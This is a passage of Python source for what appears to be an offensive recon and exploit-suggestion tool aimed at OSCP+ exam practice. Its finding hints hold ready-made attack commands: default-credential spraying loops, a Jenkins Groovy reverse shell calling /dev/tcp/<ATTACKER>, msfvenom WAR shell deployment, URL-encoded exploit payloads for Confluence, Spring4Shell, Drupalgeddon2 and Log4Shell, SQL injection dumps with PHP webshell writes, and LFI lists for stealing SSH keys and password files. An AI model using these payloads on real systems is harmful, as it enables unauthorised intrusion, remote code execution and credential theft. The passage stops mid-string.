        _amsi_m = _PS_AMSI_BYPASS.search(text[:32768])
        if _amsi_m:
            report.add("MEDIUM", "RECON", path, _ln(_amsi_m),
                       "AMSI bypass pattern captured - operator "
                       "already attempted AMSI subversion",
                       hint=("if the bypass was successful, subsequent "
                             "malicious PS commands went through; "
                             "check the transcript for what ran AFTER "
                             "the bypass  |  common patterns: "
                             "AmsiUtils reflection + AmsiScanBuffer "
                             "patching  |  IF operator is on Defender-"
                             "guarded box and wants own bypass, use "
                             "the CVE-2024-1709 patch approach or "
                             "AMSIFail.ps1 - both single-file, "
                             "framework-free (exam-legal)"))

        _fw_m = _PS_FRAMEWORK_IOC.search(text[:32768])
        if _fw_m:
            _fw_name = _fw_m.group(0)
            report.add("HIGH", "INTERESTING FILES", path, _ln(_fw_m),
                       f"BANNED offensive framework IOC: {_fw_name}",
                       hint=("this is a RED-TEAM tool captured in "
                             "loot - Empire/Covenant/PoshC2/PowerSploit"
                             "/CobaltStrike are ALL banned on OSCP+  |"
                             "  do NOT re-run these files even if "
                             "found on the target - use exam-legal "
                             "equivalents:  |  Empire equivalent: "
                             "manual reverse shells + impacket  |  "
                             "PowerSploit equivalent: raw C# via "
                             "csc.exe compile  |  CobaltStrike "
                             "equivalent: msfvenom (one-target "
                             "quota) OR nc reverse shells"))

    # iter-228: Apache Tomcat web-manager exposure. Emit HIGH RECON
    # when we see EITHER (a) the Tomcat version banner AND some
    # signal the manager path is reachable, OR (b) an explicit 401
    # Basic realm="Tomcat Manager" challenge. Doc-file gate applies.
    if not filters.is_doc_file(path):
        _tv_m = _TOMCAT_VERSION.search(text[:32768])
        _t_manager_seen = (
            _TOMCAT_MANAGER_401.search(text[:16384])
            or _TOMCAT_MANAGER_PATH.search(text[:16384]))
        # Fire when we have EITHER a 401 realm challenge (dispositive)
        # OR (version banner + manager path reference).
        _tomcat_fire = (
            _TOMCAT_MANAGER_401.search(text[:16384]) is not None
            or (_tv_m and _t_manager_seen))
        if _tomcat_fire:
            _tv_str = _tv_m.group(1) if _tv_m else "unknown"
            _tomcat_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _thost = (_tomcat_host_m.group(1) if _tomcat_host_m
                       else "<tomcat-host>")
            # CVE hint by version.
            _cve_hint = ""
            if _tv_m:
                try:
                    _tmj, _tmn, _tpt = [
                        int(x) for x in
                        (_tv_str.split(".") + ["0", "0"])[:3]]
                    # Tomcat 9.0.31 / 8.5.51 / 7.0.100 fix Ghostcat.
                    if (_tmj, _tmn, _tpt) < (7, 0, 100) or (
                            _tmj == 8 and _tmn == 5 and
                            _tpt < 51) or (
                            _tmj == 9 and _tmn == 0 and _tpt < 31):
                        _cve_hint = ("  |  ALSO Ghostcat CVE-2020-1938 "
                                     "candidate - check AJP:8009")
                except (ValueError, IndexError):
                    pass
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_tv_m or _TOMCAT_MANAGER_401.search(text)
                            or _TOMCAT_MANAGER_PATH.search(text)),
                       f"Tomcat {_tv_str} manager exposed on {_thost} "
                       f"- try default cred spray",
                       hint=(f"top-10 default sprays: for c in "
                             f"tomcat:tomcat admin:admin admin:tomcat "
                             f"admin:password tomcat:password "
                             f"tomcat:s3cret tomcat:manager "
                             f"admin:admin123 admin:changeme root:root; "
                             f"do curl -sI -u \"$c\" http://{_thost}"
                             f":8080/manager/html | head -1 | grep -v "
                             f"401 && echo FOUND:$c; done  |  post-cred "
                             f"WAR upload chain: msfvenom -p java/jsp_"
                             f"shell_reverse_tcp LHOST=<ATTACKER> "
                             f"LPORT=4444 -f war -o rev.war  (counts "
                             f"toward one-target msfvenom quota); "
                             f"curl -u <cred> --upload-file rev.war "
                             f"http://{_thost}:8080/manager/text/deploy"
                             f"?path=/rev; then GET /rev/  |  "
                             f"exam-legal manual: build WAR by hand "
                             f"with jar cvf rev.war shell.jsp (no "
                             f"msfvenom quota cost){_cve_hint}"))

    # iter-229: Jenkins /script Groovy console exposure. Fires on any
    # of:
    #   (a) X-Jenkins header - dispositive alone
    #   (b) http-title Dashboard [Jenkins] - dispositive alone
    #   (c) /script path reference AND some other Jenkins signal
    # Doc-file gate applies.
    if not filters.is_doc_file(path):
        _jh_m = _JENKINS_HEADER.search(text[:16384])
        _jt_m = _JENKINS_TITLE.search(text[:16384])
        _js_m = _JENKINS_SCRIPT_PATH.search(text[:16384])
        # Any of A/B alone dispositive; C fires when the /script URL
        # is captured AND the file mentions "Jenkins" somewhere in the
        # first 16 KB (independent corroborator that survives even
        # when the operator's capture stripped headers/title).
        # iter-231 audit fix: prior expression `(_js_m and _jh_m)` was
        # subsumed by the leading `_jh_m` so C was dead code. Now C
        # contributes independently via the "Jenkins" word check.
        _js_corroborated = (
            _js_m is not None
            and re.search(r'(?i)\bjenkins\b', text[:16384]) is not None)
        _jenkins_fire = bool(_jh_m or _jt_m or _js_corroborated)
        if _jenkins_fire:
            _jenkins_ver = _jh_m.group(1) if _jh_m else "unknown"
            _jenkins_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _jhost = (_jenkins_host_m.group(1) if _jenkins_host_m
                       else "<jenkins-host>")
            # Try to extract port from URL context.
            _jport_m = re.search(
                r'(?i)https?://[\w.\-]+:(\d+)/',
                text[:16384])
            _jport = _jport_m.group(1) if _jport_m else "8080"
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_jh_m or _jt_m or _js_m),
                       f"Jenkins {_jenkins_ver} exposed on {_jhost}"
                       f":{_jport} - check /script + default creds",
                       hint=(f"anon /script test: curl -s "
                             f"http://{_jhost}:{_jport}/script  |  "
                             f"grep 200 = walk-in Groovy RCE  |  "
                             f"default creds: for c in admin:admin "
                             f"admin:password admin:jenkins "
                             f"jenkins:jenkins jenkins:admin "
                             f"root:root admin:changeme; do curl "
                             f"-sI -u \"$c\" http://{_jhost}:{_jport}"
                             f"/manage | head -1 | grep -v 401 && "
                             f"echo FOUND:$c; done  |  Groovy RCE "
                             f"body once inside /script: curl -u "
                             f"<cred> --data-urlencode "
                             f"'script=println \"id\".execute().text' "
                             f"http://{_jhost}:{_jport}/scriptText  "
                             f"|  reverse shell: swap `id` for "
                             f"[bash,-c,'bash -i >& /dev/tcp/"
                             f"<ATTACKER>/4444 0>&1']  |  loot "
                             f"credentials.xml: /var/lib/jenkins/"
                             f"credentials.xml + master.key + "
                             f"hudson.util.Secret for offline decrypt"))

    # iter-232: DNS zone transfer captured output. Fires when we see
    # BOTH the dig header with axfr AND at least 1 record row, OR
    # 3+ record rows on their own (dnsrecon / manual capture without
    # the dig banner). Doc-file gate applies.
    if not filters.is_doc_file(path):
        _dig_hdr = _DIG_HEADER.search(text[:8192])
        _a_rows = list(_DNS_A_RECORD_ROW.finditer(text[:65536]))
        _srv_rows = list(_DNS_SRV_RECORD_ROW.finditer(text[:65536]))
        _rec_total = len(_a_rows) + len(_srv_rows)
        if (_dig_hdr and _rec_total >= 1) or _rec_total >= 3:
            _hosts_found = {}
            for _a in _a_rows[:10]:
                _hn, _rt, _ip = _a.group(1), _a.group(2), _a.group(3)
                if _rt.upper() in ("A", "AAAA"):
                    _hosts_found[_hn] = _ip
            _srv_targets = set()
            for _s in _srv_rows[:10]:
                _svc = _s.group(1).strip("_")
                _port = _s.group(2)
                _tgt = _s.group(3).rstrip(".")
                _srv_targets.add(f"{_svc}({_tgt}:{_port})")
            _sample_hosts = ", ".join(
                f"{h}={i}" for h, i in list(
                    _hosts_found.items())[:5])
            _sample_srv = ", ".join(list(_srv_targets)[:3])
            _anchor_d = _dig_hdr or (_a_rows[0] if _a_rows
                                       else _srv_rows[0])
            report.add("HIGH", "RECON", path, _ln(_anchor_d),
                       f"DNS zone transfer captured - {len(_hosts_found)} "
                       f"A + {len(_srv_rows)} SRV records extracted "
                       f"({_sample_hosts[:80]})",
                       hint=("write /etc/hosts entries for the pulled "
                             "hostnames  |  target each host individually"
                             + (f"  |  SRV records reveal services: "
                                f"{_sample_srv}" if _sample_srv else "")
                             + "  |  next: nmap --script *-enum,"
                               "smb-enum-* against each new host in the "
                               "listing"))

    # iter-234: modern web-app version-banner CVE hints. Doc-file gate
    # applies. One HIGH per (app, version) tuple.
    if not filters.is_doc_file(path):
        def _vtuple(s):
            try:
                return tuple(int(x) for x in (
                    s.split(".") + ["0", "0"])[:3])
            except (ValueError, IndexError):
                return (0, 0, 0)

        # Confluence version → CVE-2022-26134 OGNL check.
        _conf_m = _CONFLUENCE_VERSION.search(text[:16384])
        if _conf_m:
            _cv = _conf_m.group(1)
            _cvt = _vtuple(_cv)
            _cve_line = ""
            # Vulnerable ranges per Atlassian advisory:
            # <7.4.17, 7.13.0-7.13.6, 7.14.0-7.14.2, 7.15.0-7.15.1,
            # 7.16.0-7.16.3, 7.17.0-7.17.3, 7.18.0-7.18.0
            if (_cvt < (7, 4, 17)
                    or (_cvt >= (7, 13, 0) and _cvt < (7, 13, 7))
                    or (_cvt >= (7, 14, 0) and _cvt < (7, 14, 3))
                    or (_cvt >= (7, 15, 0) and _cvt < (7, 15, 2))
                    or (_cvt >= (7, 16, 0) and _cvt < (7, 16, 4))
                    or (_cvt >= (7, 17, 0) and _cvt < (7, 17, 4))
                    or (_cvt == (7, 18, 0))):
                _cve_line = ("  |  CVE-2022-26134 OGNL injection RCE: "
                             "curl -s 'http://<host>/%24%7B(%23a%3D%40o"
                             "rg.apache.commons.io.IOUtils%40toString("
                             "%40java.lang.Runtime%40getRuntime().exec("
                             "%22id%22).getInputStream())).(%40com.opens"
                             "ymphony.webwork.ServletActionContext%40get"
                             "Response().setHeader(%22X-Cmd%22%2C%23a))"
                             "%7D/'")
            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_conf_m),
                       f"Atlassian Confluence {_cv} exposed - version"
                       f" banner captured",
                       hint=(f"authed foothold: default creds "
                             f"admin:admin / admin:confluence / "
                             f"admin:password OR reuse discovered "
                             f"creds  |  post-cred: /admin/plugins/"
                             f"servlet/upm for plugin upload → JSP "
                             f"shell{_cve_line}"))

        # Jira version → CVE-2021-26086 file disclosure check.
        _jira_m = _JIRA_VERSION.search(text[:16384])
        if _jira_m:
            _jv = _jira_m.group(1)
            _jvt = _vtuple(_jv)
            _jira_cve = ""
            # iter-237 audit fix: prior middle branch was `>= 8.13.0`
            # which SKIPS the 8.6.0-8.12.x window per Atlassian
            # advisory. Correct: 8.5.0-8.5.13, 8.6.0-8.13.5, 8.14.0-
            # 8.16.0. This collapses to two contiguous windows:
            # 8.5.0-8.13.5 (excluding 8.5.14 patch line) and
            # 8.14.0-8.16.0.
            if ((_jvt >= (8, 5, 0) and _jvt < (8, 5, 14))
                    or (_jvt >= (8, 6, 0) and _jvt < (8, 13, 6))
                    or (_jvt >= (8, 14, 0) and _jvt < (8, 16, 1))):
                _jira_cve = ("  |  CVE-2021-26086 file disclosure: "
                             "curl -s 'http://<host>/s/thiswillnotwork/"
                             "_/;/META-INF/maven/com.atlassian.jira/"
                             "atlassian-jira-webapp/pom.xml'")
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_jira_m),
                       f"Atlassian Jira {_jv} exposed - version banner "
                       f"captured",
                       hint=(f"anon paths: /rest/api/2/project (project "
                             f"listing), /rest/api/2/user/picker?query="
                             f"' (user enum), /issues/?filter=-4 (open "
                             f"issues){_jira_cve}"))

        # Spring version → CVE-2022-22965 Spring4Shell check.
        # iter-237 audit fix: prior _SPRING_VERSION pattern was
        # defined but never wired to any dispatcher (dead code).
        # Spring4Shell affects Spring MVC/WebFlux < 5.3.18 and
        # < 5.2.20 on Java 9+ with Tomcat servlet packaging.
        _spr_m = _SPRING_VERSION.search(text[:16384])
        if _spr_m:
            _sv = _spr_m.group(1)
            _svt = _vtuple(_sv)
            _spr_cve = ""
            if ((_svt >= (5, 3, 0) and _svt < (5, 3, 18))
                    or (_svt >= (5, 2, 0) and _svt < (5, 2, 20))):
                _spr_cve = (
                    "  |  CVE-2022-22965 Spring4Shell RCE - "
                    "class.module.classLoader.resources.context."
                    "parent.pipeline.first.pattern injection: curl "
                    "'http://<host>/?class.module.classLoader."
                    "resources.context.parent.pipeline.first."
                    "pattern=%25%7Bc2%7Di%20if(%22j%22.equals("
                    "request.getParameter(%22pwd%22)))%7B%20java.io."
                    "InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime"
                    "().exec(request.getParameter(%22cmd%22))"
                    ".getInputStream()...' - see original Praetorian "
                    "PoC for full URL-encoded payload  |  requires "
                    "Java 9+ AND Tomcat AND WAR packaging (NOT jar)")
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_spr_m),
                       f"Spring {_sv} exposed - version banner "
                       f"captured",
                       hint=(f"actuator enum: curl -s http://<host>/"
                             f"actuator (Spring Boot) or /manage - "
                             f"reveals /env, /heapdump, /trace - "
                             f"loot for secrets  |  /env sensitive "
                             f"vars often expose SPRING_"
                             f"DATASOURCE_PASSWORD, spring.data."
                             f"redis.password{_spr_cve}"))

        # Log4j version → CVE-2021-44228 Log4Shell check.
        _l4j_m = _LOG4J_VERSION.search(text[:16384])
        if _l4j_m:
            _lv = _l4j_m.group(1)
            _lvt = _vtuple(_lv)
            # Vulnerable: 2.0-beta9 <= v < 2.17.1 (with 2.12.4 for
            # Java 7). Simple check: 2.x below 2.17.1.
            if _lvt >= (2, 0, 0) and _lvt < (2, 17, 1):
                report.add("HIGH", "SECRET-SIDECHANNEL", path,
                           _ln(_l4j_m),
                           f"Log4j {_lv} < 2.17.1 - CVE-2021-44228 "
                           f"Log4Shell RCE candidate",
                           hint=(f"JNDI trigger: any input reflected "
                                 f"into a log line: `${{jndi:ldap://<"
                                 f"attacker>/Exploit}}`  |  test "
                                 f"vectors: User-Agent, Referer, "
                                 f"X-Forwarded-For, X-Api-Version, "
                                 f"query params, POST body  |  server "
                                 f"side: use marshalsec-0.0.3-SNAPSHOT-"
                                 f"all.jar with LDAPRefServer +"
                                 f" Exploit.class payload"))

        # iter-235: WordPress fingerprint. Fires when any of:
        # - <meta generator> tag with version
        # - ?ver=X.Y.Z query on /wp-includes/ resources
        # - /wp-admin or /wp-login.php path reference (weakest;
        #   requires no other CMS signal)
        _wp_meta = _WORDPRESS_META.search(text[:32768])
        _wp_qver = _WORDPRESS_QUERY_VER.search(text[:32768])
        _wp_path = _WORDPRESS_PATH.search(text[:16384])
        if _wp_meta or _wp_qver or _wp_path:
            _wv = ((_wp_meta.group(1) if _wp_meta else None)
                   or (_wp_qver.group(1) if _wp_qver else "unknown"))
            _wp_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _wp_host = (_wp_host_m.group(1) if _wp_host_m
                        else "<wp-host>")
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_wp_meta or _wp_qver or _wp_path),
                       f"WordPress {_wv} exposed on {_wp_host} - "
                       f"enum + default cred spray",
                       hint=(f"unauth enum: wpscan --url http://"
                             f"{_wp_host} --enumerate p,vp,u,vt "
                             f"(exam-legal; NO --passwords bruteforce)"
                             f"  |  user discovery: curl -s http://"
                             f"{_wp_host}/wp-json/wp/v2/users "
                             f"(REST enum) OR /?author=1..N (iterate)"
                             f"  |  /wp-login.php default creds: "
                             f"admin:admin, admin:password, admin:"
                             f"wordpress  |  post-cred RCE via "
                             f"plugin upload: /wp-admin/plugin-install"
                             f".php OR theme editor at /wp-admin/"
                             f"theme-editor.php - inject PHP into "
                             f"404.php  |  post-cred loot: pull "
                             f"wp-config.php via LFI or after RCE - "
                             f"contains DB creds"))

        # iter-235: Joomla fingerprint.
        _jm_meta = _JOOMLA_META.search(text[:32768])
        _jm_ver = _JOOMLA_VERSION.search(text[:32768])
        _jm_hdr = _JOOMLA_HEADER.search(text[:16384])
        if _jm_meta or _jm_ver or _jm_hdr:
            _jmv = ((_jm_ver.group(1) if _jm_ver else None)
                    or (_jm_hdr.group(1) if _jm_hdr and _jm_hdr.group(1)
                         else "unknown"))
            _jm_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _jm_host = (_jm_host_m.group(1) if _jm_host_m
                        else "<joomla-host>")
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_jm_meta or _jm_ver or _jm_hdr),
                       f"Joomla {_jmv} exposed on {_jm_host} - enum "
                       f"+ default cred spray",
                       hint=(f"unauth enum: joomscan --url http://"
                             f"{_jm_host}  |  /administrator login "
                             f"default creds: admin:admin, admin:"
                             f"password, admin:joomla  |  post-cred "
                             f"RCE: template editor at /administrator/"
                             f"index.php?option=com_templates - "
                             f"inject PHP into a template file"))

        # iter-238: PHP exposure signals.
        _pinfo_m = _PHPINFO_PAGE.search(text[:32768])
        if _pinfo_m:
            _pver_m = _PHPINFO_PHP_VERSION.search(text[:32768])
            _pv = _pver_m.group(1) if _pver_m else "unknown"
            _pinfo_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _phost = (_pinfo_host_m.group(1) if _pinfo_host_m
                       else "<php-host>")
            # iter-242 audit fix: CVE-2019-11043 version-window check
            # ALSO applies when phpinfo() confirms the version - prior
            # impl only fired the CVE hint from the X-Powered-By branch
            # (which was `not _pinfo_m` gated), so phpinfo hits lost
            # the CVE line even when the extracted version was in
            # the vulnerable window.
            _pinfo_cve = ""
            if _pver_m:
                _pvt = _vtuple(_pv)
                if ((_pvt >= (7, 1, 0) and _pvt < (7, 1, 33))
                        or (_pvt >= (7, 2, 0) and _pvt < (7, 2, 24))
                        or (_pvt >= (7, 3, 0) and _pvt < (7, 3, 11))):
                    _pinfo_cve = ("  |  CVE-2019-11043 PHP-FPM RCE "
                                   "candidate (needs nginx + "
                                   "fastcgi_split_path_info): "
                                   "phuip-fpizdam.py <target>")
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_pinfo_m),
                       f"phpinfo() page exposed on {_phost} - PHP "
                       f"{_pv} + config disclosed",
                       hint=("EXTREMELY revealing intel:  |  loaded "
                             "modules → find RCE via loaded exts "
                             "(imap, ssh2, exif)  |  disable_functions "
                             "→ know which bypass path applies  |  "
                             "doc_root + include_path → LFI target "
                             "list  |  session.save_path → session "
                             "poison + LFI = RCE  |  allow_url_include "
                             "= On → direct RFI RCE via php://input"
                             + _pinfo_cve))

        # X-Powered-By PHP header (banner-only, less info than
        # phpinfo but still surfaces the version).
        _pxpb_m = _PHP_XPB.search(text[:16384])
        if _pxpb_m and not _pinfo_m:
            _pxv = _pxpb_m.group(1)
            _pxvt = _vtuple(_pxv)
            _php_cve = ""
            # PHP-FPM CVE-2019-11043 affects 7.1.x < 7.1.33, 7.2.x <
            # 7.2.24, 7.3.x < 7.3.11.
            if ((_pxvt >= (7, 1, 0) and _pxvt < (7, 1, 33))
                    or (_pxvt >= (7, 2, 0) and _pxvt < (7, 2, 24))
                    or (_pxvt >= (7, 3, 0) and _pxvt < (7, 3, 11))):
                _php_cve = ("  |  CVE-2019-11043 PHP-FPM RCE "
                            "candidate (needs nginx + "
                            "fastcgi_split_path_info): "
                            "phuip-fpizdam.py <target>")
            elif _pxvt < (5, 6, 30) and _pxvt >= (5, 0, 0):
                _php_cve = ("  |  ancient PHP 5.x - many public "
                            "CVEs; check searchsploit php " + _pxv)
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_pxpb_m),
                       f"PHP {_pxv} exposed via X-Powered-By header",
                       hint=(f"remove-me: header('X-Powered-By: ') "
                             f"in bootstrap  |  common test paths: "
                             f"/info.php, /phpinfo.php, /test.php, "
                             f"/i.php, /pinfo.php (many devs leave "
                             f"debug endpoints){_php_cve}"))

        # PHP source code leak (interpreter misconfig).
        _psrc_m = _PHP_SRC_LEAK.search(text[:32768])
        if _psrc_m:
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_psrc_m),
                       "PHP source code disclosure - interpreter "
                       "returned raw `<?php` code instead of "
                       "executing",
                       hint=("intepreter misconfig or file-handler "
                             "confusion  |  common cause: bad "
                             ".htaccess AddType or nginx location "
                             "block missing php_admin_flag  |  "
                             "operator win: grep leaked source for "
                             "DB creds, API keys, hardcoded "
                             "passwords; try php://filter/convert."
                             "base64-encode/resource=<path> LFI to "
                             "pull other .php files"))

        # iter-240: SQL injection confirmed via captured DB error or
        # UNION output. Emit ONE HIGH per file (dedup).
        _sqli_mysql = _SQLI_MYSQL_ERR.search(text[:32768])
        _sqli_mssql = _SQLI_MSSQL_ERR.search(text[:32768])
        _sqli_pg = _SQLI_POSTGRES_ERR.search(text[:32768])
        _sqli_ora = _SQLI_ORACLE_ERR.search(text[:32768])
        _sqli_union = _SQLI_UNION_OUTPUT.search(text[:32768])
        _sqli_hit = (_sqli_mysql or _sqli_mssql or _sqli_pg
                       or _sqli_ora or _sqli_union)
        if _sqli_hit:
            if _sqli_mysql:
                _db = "MySQL"
                _cols_query = ("' UNION SELECT 1,2,3,GROUP_CONCAT("
                                "schema_name),5,6 FROM "
                                "information_schema.schemata-- -")
                _users_query = ("' UNION SELECT 1,user,password,4,5,"
                                 "6 FROM users-- -")
            elif _sqli_mssql:
                _db = "MSSQL"
                _cols_query = ("' UNION SELECT NULL,NULL,name,NULL "
                                "FROM master..sysdatabases-- -")
                _users_query = ("' UNION SELECT NULL,name,password_"
                                 "hash,NULL FROM sys.sql_logins-- -")
            elif _sqli_pg:
                _db = "PostgreSQL"
                _cols_query = ("' UNION SELECT NULL,NULL,datname,"
                                "NULL FROM pg_database-- -")
                _users_query = ("' UNION SELECT NULL,usename,passwd,"
                                 "NULL FROM pg_shadow-- -")
            elif _sqli_ora:
                _db = "Oracle"
                _cols_query = ("' UNION SELECT NULL,table_name,NULL,"
                                "NULL FROM all_tables-- -")
                _users_query = ("' UNION SELECT NULL,username,"
                                 "password,NULL FROM dba_users-- -")
            else:  # union output only
                _db = "unknown-DBMS"
                _cols_query = "manually craft UNION per DB fingerprint"
                _users_query = "grep captured output for cred columns"
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_sqli_hit),
                       f"SQL injection confirmed - {_db} error/UNION "
                       f"output captured",
                       hint=(f"MANUAL UNION extraction (sqlmap NOT "
                             f"exam-legal):  |  1. determine column "
                             f"count via ORDER BY 1..N  |  2. find "
                             f"reflected columns: "
                             f"' UNION SELECT 1,2,3,4-- -  |  3. "
                             f"list DBs/tables: {_cols_query}  |  "
                             f"4. dump user table: {_users_query}"
                             f"  |  RCE if MySQL FILE priv: "
                             f"' UNION SELECT '<?php system("
                             f"$_GET[c]);?>' INTO OUTFILE '/var/www/"
                             f"html/sh.php'-- -  |  MSSQL xp_cmd"
                             f"shell: '; EXEC xp_cmdshell 'whoami'-- -"
                             f"  |  PostgreSQL COPY: '; COPY (SELECT"
                             f" '<?php...') TO '/var/www/html/sh."
                             f"php'-- -"))

        # iter-239: LFI captured response body. Filename gate: skip
        # /etc/passwd, /etc/shadow, /boot.ini paths (real system-file
        # dumps, not LFI captures).
        _plow_lfi = path.lower().replace("\\", "/")
        _lfi_gate_skip = (
            _plow_lfi.endswith(("/etc/passwd", "/etc/shadow",
                                  "/etc/group", "/boot.ini",
                                  "/win.ini", "win.ini", "boot.ini"))
            or "/passwd.bak" in _plow_lfi
            or _plow_lfi.endswith(".passwd"))
        if not _lfi_gate_skip:
            _lfi_pw = _LFI_ETC_PASSWD.search(text[:32768])
            _lfi_bt = _LFI_BOOT_INI.search(text[:32768])
            _lfi_wi = _LFI_WIN_INI.search(text[:32768])
            _lfi_anchor = _lfi_pw or _lfi_bt or _lfi_wi
            if _lfi_anchor:
                _tgt_desc = ("/etc/passwd" if _lfi_pw
                              else ("boot.ini" if _lfi_bt
                                     else "Win.ini"))
                _is_win = _lfi_bt or _lfi_wi
                # Different LFI2RCE chains for Linux vs Windows.
                if _is_win:
                    _rce_hint = (
                        "  |  LFI2RCE chains for Windows: "
                        "log-poison IIS logs at "
                        "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\ex*.log"
                        "  |  session poison C:\\Windows\\Temp\\sess_*"
                        "  |  SMB share mount + PHP exec if writable")
                else:
                    _rce_hint = (
                        "  |  LFI2RCE chains for Linux: /proc/self/"
                        "environ (User-Agent poisoning); "
                        "/var/log/apache2/access.log + User-Agent "
                        "log-poison; /var/log/auth.log + SSH "
                        "log-poison (ssh 'PAYLOAD'@target); "
                        "PHP_SESSION_UPLOAD_PROGRESS + session-file "
                        "poison at /var/lib/php/sessions/sess_*")
                report.add("CRITICAL", "SECRET-SIDECHANNEL", path,
                           _ln(_lfi_anchor),
                           f"LFI confirmed - captured response body "
                           f"contains {_tgt_desc}",
                           hint=(f"next reads: /etc/shadow (if root "
                                 f"context), /home/*/.ssh/id_rsa, "
                                 f"/home/*/.bash_history, /root/."
                                 f"bash_history, /var/www/*/config."
                                 f"php, /var/www/*/wp-config.php, "
                                 f"/etc/mysql/*.cnf; Windows: "
                                 f"C:\\inetpub\\wwwroot\\web.config, "
                                 f"C:\\Windows\\System32\\config\\SAM "
                                 f"(via VSS), C:\\Windows\\Panther\\"
                                 f"Unattend.xml{_rce_hint}"))

        # iter-235: Drupal fingerprint (banner-side, complements
        # iter-22 pre-7.59/8.5.1 payload-marker detector).
        _dp_hdr = _DRUPAL_HEADER.search(text[:16384])
        _dp_meta = _DRUPAL_META.search(text[:32768])
        if _dp_hdr or _dp_meta:
            _dv = (_dp_hdr.group(1) if _dp_hdr
                    else _dp_meta.group(1))
            _dp_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _dp_host = (_dp_host_m.group(1) if _dp_host_m
                         else "<drupal-host>")
            # Drupalgeddon2 CVE-2018-7600 hint if Drupal 7 or 8
            # (regardless of minor since /?q=user/... trigger works).
            _dg_hint = ""
            try:
                _dv_major = int(_dv.split(".")[0])
                if _dv_major in (7, 8):
                    _dg_hint = ("  |  CVE-2018-7600 Drupalgeddon2 (D7/"
                                "D8 <7.58/8.3.9/8.4.6/8.5.1): curl -s "
                                f"'http://{_dp_host}/?q=user/password&"
                                "name%5B%23post_render%5D%5B%5D=exec&"
                                "name%5B%23markup%5D=id&name%5B%23"
                                "type%5D=markup' -d 'form_id=user_pass"
                                "&_triggering_element_name=name&"
                                "_triggering_element_value=&opz=E-mail+"
                                "new+password'")
            except (ValueError, IndexError):
                pass
            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_dp_hdr or _dp_meta),
                       f"Drupal {_dv} exposed on {_dp_host} - enum + "
                       f"exploit chain",
                       hint=(f"unauth enum: droopescan scan drupal "
                             f"-u http://{_dp_host}  |  users at "
                             f"/user/1, /user/2 iterate  |  post-cred "
                             f"path: install malicious module{_dg_hint}"))

    # iter-199: OpenSSH banner detection + CVE range flags. Emits INFO
    # RECON per unique version + a HIGH marker for each known-vulnerable
    # range. Two-tuple (major, minor); patch/p_num held separately so
    # `7.7p0` == `7.7` and `7.7p2` still counts. Doc-file gated.
    if not filters.is_doc_file(path):
        _ssh_seen = set()
        for m in _OPENSSH_BANNER.finditer(text):
            try:
                maj = int(m.group(1))
                minn = int(m.group(2))
                pnum = int(m.group(3)) if m.group(3) else 0
            except (TypeError, ValueError):
                continue
            # Sanity gate: real OpenSSH majors are 3..10 for years covered
            # here.
            if maj < 3 or maj > 10:
                continue
            key = (maj, minn, pnum)
            if key in _ssh_seen:
                continue
            _ssh_seen.add(key)
            vsz = f"{maj}.{minn}" + (f"p{pnum}" if pnum else "")
            report.add("INFO", "RECON", path, _ln(m),
                       f"OpenSSH banner: {vsz}",
                       hint=(f"cross-ref by version: searchsploit openssh "
                             f"{maj}.{minn}"))
            # CVE-2018-15473 (user enumeration): < 7.7
            if (maj, minn) < (7, 7):
                report.add("HIGH", "RECON", path, _ln(m),
                           f"OpenSSH {vsz} vulnerable to CVE-2018-15473 "
                           f"(username enumeration via timing)",
                           hint=("PoC: `git clone github.com/Rhynorater/"
                                 "CVE-2018-15473-Exploit; python3 "
                                 "sshUsernameEnumExploit.py -u users.txt "
                                 "<host>` - use to verify users found in "
                                 "AD/RID enum are also local shell users"))
            # CVE-2016-6210 (older user enum via hash length): < 7.3
            if (maj, minn) < (7, 3):
                report.add("HIGH", "RECON", path, _ln(m),
                           f"OpenSSH {vsz} may also be vulnerable to "
                           f"CVE-2016-6210 (older user enum via HASHING)",
                           hint=("nmap --script ssh-enum-users - or the "
                                 "python PoC in searchsploit -m 40113"))
            # CVE-2023-38408 (client-side agent RCE via forwarded agent): < 9.3p2
            # NB: this needs client-side forwarding to trigger, so intel only
            # from server banner unless we're the client.
            if (maj, minn, pnum) < (9, 3, 2):
                report.add("MEDIUM", "RECON", path, _ln(m),
                           f"OpenSSH {vsz} client < 9.3p2 - CVE-2023-38408 "
                           f"(agent-forwarding RCE if we're the client)",
                           hint=("intel-only from banner alone; if operator's "
                                 "own ssh client is < 9.3p2 AND they forward "
                                 "agent to a compromised box, RCE against "
                                 "the operator - warn, don't enable "
                                 "ForwardAgent on untrusted hosts"))
            # iter-243: Terrapin CVE-2023-48795 for < 9.6. Prefix-truncation
            # via SSH extension negotiation - MITM strips messages. Since
            # MITM isn't exam-legal and the operator can't MITM the exam
            # lab, this is INTEL-only.
            if (maj, minn) < (9, 6):
                report.add("INFO", "RECON", path, _ln(m),
                           f"OpenSSH {vsz} < 9.6 - CVE-2023-48795 Terrapin "
                           f"(intel only - requires MITM position)",
                           hint=("prefix-truncation attack on SSH extension "
                                 "negotiation; only applicable if the operator "
                                 "is between two hosts on the SAME wire - "
                                 "OSCP+ exam usually isolates the tester so "
